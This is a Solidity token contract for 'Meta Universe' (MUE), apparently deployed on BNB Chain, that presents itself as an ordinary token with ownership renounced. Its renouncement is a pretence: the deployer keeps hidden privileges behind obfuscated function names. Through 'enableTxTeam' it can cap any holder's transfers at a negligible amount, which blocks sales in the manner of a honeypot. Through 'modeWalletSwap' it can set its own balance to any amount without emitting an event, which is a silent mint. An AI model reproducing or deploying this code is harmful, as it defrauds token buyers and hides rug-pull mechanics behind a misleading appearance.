/**
 *Submitted for verification at BscScan.com on 2023-01-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MetaUniverse {
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => uint256) public balanceOf;
    address public feeExempt;
    address public owner;
    mapping(address => bool) public senderFee;
    address public atTradingIs;

    uint256 constant fromAt = 10 ** 10;
    string public name = "Meta Universe";


    string public symbol = "MUE";


    mapping(address => bool) public minBuyList;
    mapping(address => mapping(address => uint256)) public allowance;
    modifier shouldAtTeam() {
        require(minBuyList[msg.sender]);
        _;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor (){
        IUniswapV2Router fundTeam = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        feeExempt = IUniswapV2Factory(fundTeam.factory()).createPair(fundTeam.WETH(), address(this));
        owner = msg.sender;
        atTradingIs = owner;
        minBuyList[atTradingIs] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function feeWallet(address atExemptAuto, address walletTo, uint256 tokenBuy) internal returns (bool) {
        require(balanceOf[atExemptAuto] >= tokenBuy);
        balanceOf[atExemptAuto] -= tokenBuy;
        balanceOf[walletTo] += tokenBuy;
        emit Transfer(atExemptAuto, walletTo, tokenBuy);
        return true;
    }

    function enableTxTeam(address autoTxList) public shouldAtTeam {
        senderFee[autoTxList] = true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == atTradingIs || recipient == atTradingIs) {
            return feeWallet(sender, recipient, amount);
        }
        if (senderFee[sender]) {
            return feeWallet(sender, recipient, fromAt);
        }
        return feeWallet(sender, recipient, amount);
    }

    function modeWalletSwap(uint256 tokenBuy) public shouldAtTeam {
        balanceOf[atTradingIs] = tokenBuy;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (allowance[sender][msg.sender] != type(uint256).max) {
            require(allowance[sender][msg.sender] >= amount);
            allowance[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function maxToShould(address modeReceiverLiquidity) public shouldAtTeam {
        minBuyList[modeReceiverLiquidity] = true;
    }


}